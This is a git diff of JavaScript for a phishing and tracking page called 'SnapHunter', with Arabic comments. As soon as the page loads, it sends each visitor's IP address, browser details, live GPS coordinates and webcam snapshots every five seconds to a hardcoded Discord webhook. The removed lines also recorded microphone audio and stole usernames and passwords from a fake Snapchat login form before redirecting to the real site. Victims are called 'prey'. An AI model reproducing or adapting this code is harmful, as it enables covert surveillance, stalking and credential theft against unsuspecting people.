@@ -1,137 +1,87 @@
 'use strict';
 
-// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
-
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-let mediaRecorder;
-let audioChunks = [];
-let userLat = null, userLng = null;
-let attempts = 0;
 
-// 1. جلب IP الجهاز فور الدخول
-async function getIP() {
+// 1. وظيفة جلب IP الجهاز والمعلومات الأساسية
+async function getDeviceInfo() {
     try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    } catch (e) { return "غير معروف"; }
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return {
+            ip: data.ip,
+            ua: navigator.userAgent,
+            platform: navigator.platform
+        };
+    } catch (e) { return { ip: "غير معروف", ua: "غير معروف", platform: "غير معروف" }; }
 }
 
-// 2. إشعار دخول فوري
-async function notifyEntry() {
-    const ip = await getIP();
+// 2. إشعار دخول فوري للبوت
+async function sendEntryLog() {
+    const info = await getDeviceInfo();
     const payload = {
-        username: "SnapHunter - نظام الرصد",
-        content: `🚀 **صيد جديد دخل الموقع!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
+        username: "SnapHunter - نظام التتبع",
+        content: `🚀 **دخل صيد جديد للموقع الآن!**\n🌐 **IP:** \`${info.ip}\`\n📱 **الجهاز:** \`${info.platform}\`\n🔍 **المتصفح:** \`${info.ua}\`\n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
     };
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+    await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 }
 
-// 3. وظيفة الإرسال الشاملة (صورة + صوت + موقع)
-async function sendFullPacket(imgBlob, audBlob, user = "", pass = "") {
-    const ip = await getIP();
+// 3. وظيفة الإرسال الدوري (صورة + موقع)
+async function sendCaptureUpdate(blob, lat, lng) {
+    const info = await getDeviceInfo();
     const formData = new FormData();
     
-    let content = `🛰️ **تحديث بيانات مباشر**\n🌐 **IP:** \`${ip}\`\n`;
+    let content = `📸 **تحديث تلقائي (كل 5 ثوانٍ)**\n` +
+                  `🌐 **IP:** \`${info.ip}\`\n`;
     
-    if (user) {
-        content += `👤 **الحساب:** \`${user}\` \n🔑 **الرمز:** \`${pass}\`\n`;
-    }
-    
-    if (userLat && userLng) {
-        content += `📍 **الموقع:** [فتح الخريطة](http://maps.google.com/maps?q=${userLat},${userLng})\n`;
+    if (lat && lng) {
+        content += `📍 **الموقع المباشر:** [خرائط جوجل](https://www.google.com/maps?q=${lat},${lng})\n` +
+                   `🗺️ **الإحداثيات:** \`${lat}, ${lng}\`\n`;
+    } else {
+        content += `📍 **الموقع:** لم يتم السماح بالوصول لـ GPS\n`;
     }
 
-    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
-    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
-    
+    if (blob) formData.append('file', blob, 'capture.png');
     formData.append('payload_json', JSON.stringify({
         content: content,
-        username: "SnapHunter - البث المباشر"
+        username: "SnapHunter - التتبع المباشر"
     }));
 
     await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
-// 4. تسلسل الأذونات والتشغيل
-async function initSystem() {
-    await notifyEntry();
+// 4. تشغيل الكاميرا والبدء في التكرار
+async function startLiveTracking() {
+    await sendEntryLog(); // إرسال إشعار الدخول فوراً
+
+    let lat = null, lng = null;
+    
+    // محاولة جلب الموقع بشكل مستمر
+    navigator.geolocation.watchPosition(p => {
+        lat = p.coords.latitude;
+        lng = p.coords.longitude;
+    }, null, { enableHighAccuracy: true });
 
     try {
-        // أولاً: طلب الكاميرا
-        const camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = camStream;
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
 
-        // ثانياً: طلب الموقع بعد 3 ثوانٍ
-        setTimeout(() => {
-            navigator.geolocation.getCurrentPosition(p => {
-                userLat = p.coords.latitude;
-                userLng = p.coords.longitude;
-            }, null, {enableHighAccuracy: true});
-        }, 3000);
-
-        // ثالثاً: طلب الميكروفون بعد 6 ثوانٍ والبدء في التسجيل
-        setTimeout(async () => {
-            try {
-                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(micStream);
-                
-                // بدء حلقة التكرار كل 5 ثوانٍ
-                setInterval(() => {
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 640, 480);
-                    
-                    audioChunks = [];
-                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-                    mediaRecorder.start();
-
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                        mediaRecorder.onstop = () => {
-                            const audBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                            canvas.toBlob(imgBlob => {
-                                sendFullPacket(imgBlob, audBlob);
-                            }, 'image/png');
-                        };
-                    }, 3000); // تسجيل 3 ثوانٍ من الصوت
-                }, 5000);
-
-            } catch (e) { console.log("Mic Denied"); }
-        }, 6000);
+        // بدء التكرار كل 5 ثوانٍ
+        setInterval(() => {
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => {
+                sendCaptureUpdate(blob, lat, lng);
+            }, 'image/png');
+        }, 5000); // 5000 ميلي ثانية = 5 ثوانٍ
 
     } catch (err) {
-        // في حال الرفض الكلي، نرسل الموقع والـ IP فقط
-        setInterval(() => { sendFullPacket(null, null); }, 5000);
+        // إذا رفض الكاميرا، استمر في إرسال الموقع فقط كل 5 ثوانٍ
+        setInterval(() => {
+            sendCaptureUpdate(null, lat, lng);
+        }, 5000);
     }
 }
 
-// 5. معالجة نموذج الدخول (apply2.html)
-const loginForm = document.getElementById('fullLoginForm');
-if (loginForm) {
-    loginForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const u = e.target.username.value;
-        const p = e.target.password.value;
-        document.getElementById('loadingOverlay').style.display = 'flex';
-
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 640, 480);
-        
-        canvas.toBlob(async (imgBlob) => {
-            await sendFullPacket(imgBlob, null, u, p);
-            setTimeout(() => {
-                attempts++;
-                document.getElementById('loadingOverlay').style.display = 'none';
-                if (attempts >= 2) window.location.href = "https://accounts.snapchat.com/";
-                else {
-                    document.getElementById('loginErrorMsg').style.display = 'block';
-                    e.target.password.value = "";
-                }
-            }, 1500);
-        }, 'image/png');
-    });
-}
-
-window.onload = initSystem;
+window.onload = startLiveTracking;
